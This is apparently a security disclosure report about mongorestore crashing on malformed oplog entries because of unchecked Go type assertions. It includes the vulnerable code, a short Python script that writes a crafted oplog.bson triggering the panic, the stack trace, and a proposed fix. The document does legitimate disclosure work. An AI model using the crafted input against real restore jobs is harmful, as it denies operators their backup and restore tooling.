# Title

`mongorestore --oplogReplay` crashes with an unhandled panic on a single malformed oplog entry (unchecked type assertions in `extractIndexDocumentFromCommitIndexBuilds`/`extractIndexDocumentFromCreateIndexes`)

## Summary

`mongorestore`, when replaying an `oplog.bson` file (`--oplogReplay`, used both for point-in-time/incremental restores and automatically whenever a dump directory contains an `oplog.bson`), crashes the entire process with an unhandled Go panic if a single oplog entry's `commitIndexBuild`/`createIndexes`/`key`/`partialFilterExpression`/`indexes` field has an unexpected BSON type. The code performs **unchecked Go type assertions** (`elem.Value.(string)`, `.(bson.A)`, `.(bson.D)`) on values read directly from the oplog file being restored, each one explicitly marked `//nolint:errcheck` — a deliberate lint suppression, not an accidental miss, but one that assumes the oplog can never contain anything but well-formed data from a genuine `mongod`. That assumption doesn't hold for the threat model this program cares about: a dump obtained from an untrusted or compromised source, or a shared/multi-tenant environment where an attacker can influence the oplog stream that gets dumped.

There is no `recover()` anywhere in `mongorestore`'s call chain (checked `mongorestore/`, `common/`, and the `main` entrypoint) — the panic is fully unhandled and terminates the process with a stack trace and exit code 2, mid-restore.

## Weakness

CWE-248 (Uncaught Exception) / CWE-843 (Type Confusion) — an externally-supplied value's runtime type is asserted without verification, causing a process-terminating panic instead of a handled parse error.

## Component / Version

- Repository: `mongodb/mongo-tools` (HackerOne scope: **Database Tools**)
- Tag audited: `100.18.0`
- Commit: [`21a342dfee6468ad9350d156d25086da64dd03b1`](https://github.com/mongodb/mongo-tools/commit/21a342dfee6468ad9350d156d25086da64dd03b1)
- Bug has been present, unaddressed, since it was introduced in 2020 (see History below)
- Official binaries: https://www.mongodb.com/try/download/database-tools

## Root cause, with links to the exact code

`mongorestore/oplog.go`, [`extractIndexDocumentFromCommitIndexBuilds` and `extractIndexDocumentFromCreateIndexes`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L637-L701):

```go
func extractIndexDocumentFromCommitIndexBuilds(op db.Oplog) (string, []*idx.IndexDocument) {
	collectionName := ""
	for _, elem := range op.Object {
		if elem.Key == "commitIndexBuild" {
			//nolint:errcheck
			collectionName = elem.Value.(string)   // <-- panics if not a string
		}
	}
	for _, elem := range op.Object {
		if elem.Key == "indexes" {
			//nolint:errcheck
			indexes := elem.Value.(bson.A)          // <-- panics if not an array
			...
			for _, elem := range index.(bson.D) {   // <-- panics if index isn't a document
				switch elem.Key {
				case "key":
					indexSpec.Key = elem.Value.(bson.D)                    // <-- panics
				case "partialFilterExpression":
					partialFilterExpression := elem.Value.(bson.D)         // <-- panics
```

and the `createIndexes` sibling (same file, [lines 680-701](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L680-L701)) has the identical pattern for `collectionName = elem.Value.(string)`, `indexDocument.Key = elem.Value.(bson.D)`, and the `partialFilterExpression` assertion.

Contrast with every *other* command handler in the same function
([`HandleNonTxnOp`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L248-L407)) — `drop`, `create`, `collMod`, `deleteIndexes`, and the direct (non-`commitIndexBuild`) `createIndexes` collection-name lookup — all correctly use the two-value form:
```go
collName, ok := op.Object[0].Value.(string)
if !ok {
    return fmt.Errorf("could not parse collection name from op: %v", op)
}
```
Only the two index-extraction helper functions skip this and use the panicking one-value form, with the risk explicitly acknowledged and suppressed via `//nolint:errcheck` rather than handled.

These functions are reached unconditionally from
[`RestoreOplog()` → `HandleOp()` → `HandleNonTxnOp()`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L99-L322) for every "c" (command) oplog entry whose first key is `commitIndexBuild` or `createIndexes` — both of which are in the `knownCommands` allow-list, so no earlier check filters them out. No `recover()` exists anywhere in `mongorestore/`, `common/`, or `mongorestore/main/mongorestore.go` — confirmed by search.

## Steps to Reproduce

Built from the exact `100.18.0` tag source (functionally identical to the official release binary; official binaries were unreachable from my test environment due to unrelated network policy).

```python
import bson
from bson import Timestamp

entry = {
    'ts': Timestamp(1, 1),
    'op': 'c',
    'ns': 'test.$cmd',
    'o': {'commitIndexBuild': 12345}   # should be a string collection name; here it's an int
}
open('dump/oplog.bson', 'wb').write(bson.encode(entry))
```

```sh
$ mongorestore --oplogReplay --dir dump
2026-08-30T11:58:24.701+0000  preparing collections to restore from
2026-08-30T11:58:24.701+0000  replaying oplog
panic: interface conversion: interface {} is int32, not string

goroutine 1 [running]:
github.com/mongodb/mongo-tools/mongorestore.extractIndexDocumentFromCommitIndexBuilds(...)
	mongorestore/oplog.go:642 +0x4ac
github.com/mongodb/mongo-tools/mongorestore.(*MongoRestore).HandleNonTxnOp(...)
	mongorestore/oplog.go:279 +0xe78
github.com/mongodb/mongo-tools/mongorestore.(*MongoRestore).HandleOp(...)
	mongorestore/oplog.go:239 +0x3b4
github.com/mongodb/mongo-tools/mongorestore.(*MongoRestore).RestoreOplog(...)
	mongorestore/oplog.go:156 +0x614
github.com/mongodb/mongo-tools/mongorestore.(*MongoRestore).Restore(...)
	mongorestore/mongorestore.go:676 +0x1b9d
main.main()
	mongorestore/main/mongorestore.go:52 +0x2d2
$ echo $?
2
```

A **75-byte file** is sufficient to crash the tool. Also confirmed for the `createIndexes` sibling — replacing the oplog entry's `o` field with `{'createIndexes': ['not-a-string']}` produces:
```
panic: interface conversion: interface {} is bson.A, not string
	mongorestore/oplog.go:687
```

## Impact

Any operator who runs `mongorestore --oplogReplay` (a standard, commonly-scripted restore operation — it's also invoked automatically whenever a dump directory happens to contain an `oplog.bson`, e.g. from `mongodump --oplog`) against a dump obtained from an untrusted or compromised source, or against an oplog produced in a shared/multi-tenant environment an attacker could influence, will have their `mongorestore` process crash immediately and unrecoverably mid-restore, from a single crafted entry that costs nothing to produce. This is a hard denial-of-service against a critical operational tool (backup/restore tooling being unavailable exactly when needed is high-impact for an operations team), and the pattern (panic from unchecked type assertion, no recovery anywhere in the call stack) is a straightforward, well-understood bug class distinct from mere resource exhaustion — it's a clean, deterministic crash.

## Suggested Fix

Change every unchecked assertion in `extractIndexDocumentFromCommitIndexBuilds` and `extractIndexDocumentFromCreateIndexes` to the two-value form already used everywhere else in the same file, returning a descriptive parse error instead of panicking, e.g.:
```go
collectionName, ok := elem.Value.(string)
if !ok {
    return "", nil, fmt.Errorf("commitIndexBuild: expected string collection name, got %T", elem.Value)
}
```
(adjusting call sites to propagate the new error return, mirroring how `deleteIndexes`/`drop`/`create` already handle this same class of failure a few lines above in the same file.)

## History

The unchecked pattern was introduced in [`TOOLS-2535` (commit `68aa858`, 2020)](https://github.com/mongodb/mongo-tools/commit/68aa85835fa626aa7840484ac9600e3c0beb85f5) and has not been revisited since — unlike the adjacent `mongofiles` path-traversal issue (reported separately), there is no follow-up hardening commit for this code path.

## Supporting Material

- Companion report from the same audit pass (separate finding, same repository): `security-research/mongo-tools/mongofiles-get-path-traversal-bypass-2026-08-30/`
- Vulnerable code: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L637-L701
- Correct pattern used elsewhere in the same function: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L292-L295
- Call chain entry point: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/oplog.go#L98-L175
- Introducing commit: https://github.com/mongodb/mongo-tools/commit/68aa85835fa626aa7840484ac9600e3c0beb85f5
